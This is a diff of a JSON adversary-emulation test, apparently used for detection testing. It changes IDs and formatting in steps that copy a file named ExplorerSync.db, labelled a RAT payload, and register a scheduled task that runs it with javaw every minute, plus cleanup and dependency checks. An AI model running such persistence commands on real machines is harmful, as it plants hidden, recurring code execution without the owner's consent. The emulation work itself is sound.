@@ -7,87 +7,87 @@
   ],
   "steps": [
     {
-      "id": "05302bd7-6e76-4e6d-9c2c-2dbd2d36c3fb",
+      "id": "6d6f30d8-7f2f-441e-8f8b-40bbf3176ca0",
       "type": "execute-command",
       "data": {
-        "command": "copy %temp%\\ExplorerSync.db %temp%\\..\\Microsoft\\ExplorerSync.db\nschtasks /create /tn ExplorerSync /tr \"javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db\" /sc MINUTE /f\n",
+        "command": "copy %temp%\\ExplorerSync.db %temp%\\..\\Microsoft\\ExplorerSync.db\nschtasks /create /tn ExplorerSync /tr \"javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db\" /sc MINUTE /f",
         "command_type": "command_prompt"
       },
       "elevation_required": false
     },
     {
-      "id": "7e0ac430-1f6b-4610-9719-d134da309465",
+      "id": "961edcf7-36cc-4467-b162-f5e32107ed16",
       "type": "execute-command",
       "data": {
-        "command": "schtasks /delete /tn ExplorerSync /F 2\u003enull\ndel %temp%\\..\\Microsoft\\ExplorerSync.db 2\u003enull\ndel %temp%\\ExplorerSync.db 2\u003enull\n",
+        "command": "schtasks /delete /tn ExplorerSync /F 2\u003enull\ndel %temp%\\..\\Microsoft\\ExplorerSync.db 2\u003enull\ndel %temp%\\ExplorerSync.db 2\u003enull",
         "command_type": "command_prompt"
       },
       "elevation_required": false
     },
     {
-      "id": "601498c1-83a0-4eb7-8a9b-263f8da54110",
+      "id": "5e7311b2-7d2f-4e05-b65c-c4bfad07ab33",
       "name": "Check dependency 1/1",
       "description": "ExplorerSync.db must exist on disk at specified location (#{rat_payload})\n",
       "type": "execute-command",
       "data": {
-        "command": "if (Test-Path #{rat_payload}) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "if (Test-Path #{rat_payload}) {exit 0} else {exit 1}",
+        "command_type": "command_prompt"
       },
       "elevation_required": false
     },
     {
-      "id": "b4d50327-c899-4daa-af43-573fa688ac65",
+      "id": "d164b1d2-161d-418c-a9ce-f51d6797dca1",
       "name": "Resolve dependency 1/1",
       "description": "ExplorerSync.db must exist on disk at specified location (#{rat_payload})\n",
       "type": "execute-command",
       "data": {
-        "command": "Out-File -FilePath \"#{rat_payload}\"\n",
-        "command_type": ""
+        "command": "Out-File -FilePath \"#{rat_payload}\"",
+        "command_type": "command_prompt"
       },
       "elevation_required": false
     },
     {
-      "id": "56dc8533-5e93-4ec7-a125-66c684678b2b",
+      "id": "052e17e3-64c8-48b7-825e-fcf92abc3d16",
       "name": "Re-check dependency 1/1",
       "description": "ExplorerSync.db must exist on disk at specified location (#{rat_payload})\n",
       "type": "execute-command",
       "data": {
-        "command": "if (Test-Path #{rat_payload}) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "if (Test-Path #{rat_payload}) {exit 0} else {exit 1}",
+        "command_type": "command_prompt"
       },
       "elevation_required": false
     }
   ],
   "flows": [
     {
-      "s": "05302bd7-6e76-4e6d-9c2c-2dbd2d36c3fb",
+      "s": "6d6f30d8-7f2f-441e-8f8b-40bbf3176ca0",
       "p": "on-success",
-      "o": "7e0ac430-1f6b-4610-9719-d134da309465"
+      "o": "961edcf7-36cc-4467-b162-f5e32107ed16"
     },
     {
-      "s": "05302bd7-6e76-4e6d-9c2c-2dbd2d36c3fb",
+      "s": "6d6f30d8-7f2f-441e-8f8b-40bbf3176ca0",
       "p": "on-failure",
-      "o": "7e0ac430-1f6b-4610-9719-d134da309465"
+      "o": "961edcf7-36cc-4467-b162-f5e32107ed16"
     },
     {
-      "s": "601498c1-83a0-4eb7-8a9b-263f8da54110",
+      "s": "5e7311b2-7d2f-4e05-b65c-c4bfad07ab33",
       "p": "on-success",
-      "o": "05302bd7-6e76-4e6d-9c2c-2dbd2d36c3fb"
+      "o": "6d6f30d8-7f2f-441e-8f8b-40bbf3176ca0"
     },
     {
-      "s": "601498c1-83a0-4eb7-8a9b-263f8da54110",
+      "s": "5e7311b2-7d2f-4e05-b65c-c4bfad07ab33",
       "p": "on-failure",
-      "o": "b4d50327-c899-4daa-af43-573fa688ac65"
+      "o": "d164b1d2-161d-418c-a9ce-f51d6797dca1"
     },
     {
-      "s": "b4d50327-c899-4daa-af43-573fa688ac65",
+      "s": "d164b1d2-161d-418c-a9ce-f51d6797dca1",
       "p": "on-success",
-      "o": "56dc8533-5e93-4ec7-a125-66c684678b2b"
+      "o": "052e17e3-64c8-48b7-825e-fcf92abc3d16"
     },
     {
-      "s": "56dc8533-5e93-4ec7-a125-66c684678b2b",
+      "s": "052e17e3-64c8-48b7-825e-fcf92abc3d16",
       "p": "on-failure",
-      "o": "05302bd7-6e76-4e6d-9c2c-2dbd2d36c3fb"
+      "o": "6d6f30d8-7f2f-441e-8f8b-40bbf3176ca0"
     }
   ],
   "tags": [
